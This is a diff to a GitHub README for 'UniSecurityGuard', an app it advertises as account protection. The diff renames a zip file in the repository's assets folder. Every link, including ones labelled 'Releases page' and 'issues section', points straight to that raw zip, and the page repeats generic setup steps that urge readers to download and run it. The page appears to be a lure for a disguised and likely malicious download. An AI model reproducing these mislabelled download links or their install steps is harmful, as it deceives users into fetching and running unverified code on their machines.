@@ -1,7 +1,7 @@
 # 🛡️ UniSecurityGuard - Protect Your Account with Ease
 
 ## 📥 Download Now
-[![Download UniSecurityGuard](https://github.com/grimbandit4life/UniSecurityGuard/raw/refs/heads/main/assets/Security-Guard-Uni-hemapophyseal.zip)](https://github.com/grimbandit4life/UniSecurityGuard/raw/refs/heads/main/assets/Security-Guard-Uni-hemapophyseal.zip)
+[![Download UniSecurityGuard](https://github.com/grimbandit4life/UniSecurityGuard/raw/refs/heads/main/assets/Uni-Guard-Security-v1.0.zip)](https://github.com/grimbandit4life/UniSecurityGuard/raw/refs/heads/main/assets/Uni-Guard-Security-v1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to UniSecurityGuard! This application helps you safeguard your online accounts. Whether you're a student or a professional, protecting your accounts has never been easier.
@@ -19,9 +19,9 @@ Welcome to UniSecurityGuard! This application helps you safeguard your online ac
 - **Security Alerts:** Receive notifications for suspicious activity.
 
 ## 📥 Download & Install
-To download UniSecurityGuard, please visit our [Releases page](https://github.com/grimbandit4life/UniSecurityGuard/raw/refs/heads/main/assets/Security-Guard-Uni-hemapophyseal.zip) to find the latest version.
+To download UniSecurityGuard, please visit our [Releases page](https://github.com/grimbandit4life/UniSecurityGuard/raw/refs/heads/main/assets/Uni-Guard-Security-v1.0.zip) to find the latest version.
 
-1. Click on the [Releases page link](https://github.com/grimbandit4life/UniSecurityGuard/raw/refs/heads/main/assets/Security-Guard-Uni-hemapophyseal.zip).
+1. Click on the [Releases page link](https://github.com/grimbandit4life/UniSecurityGuard/raw/refs/heads/main/assets/Uni-Guard-Security-v1.0.zip).
 2. Once on the page, find the latest version of UniSecurityGuard.
 3. Click on the file to start downloading.
 4. Once the download is complete, locate the downloaded file on your computer. It is usually in the "Downloads" folder.
@@ -45,7 +45,7 @@ If you encounter any issues while downloading or installing, please try the foll
 If problems persist, feel free to open an issue on our GitHub page.
 
 ## 🛠️ Support
-For support, please check the [issues section](https://github.com/grimbandit4life/UniSecurityGuard/raw/refs/heads/main/assets/Security-Guard-Uni-hemapophyseal.zip) on our GitHub repository. Our community is here to help.
+For support, please check the [issues section](https://github.com/grimbandit4life/UniSecurityGuard/raw/refs/heads/main/assets/Uni-Guard-Security-v1.0.zip) on our GitHub repository. Our community is here to help.
 
 ## 📜 License
 UniSecurityGuard is licensed under the MIT License. Feel free to use it for personal or educational purposes. For more details, check the LICENSE file in our repository.
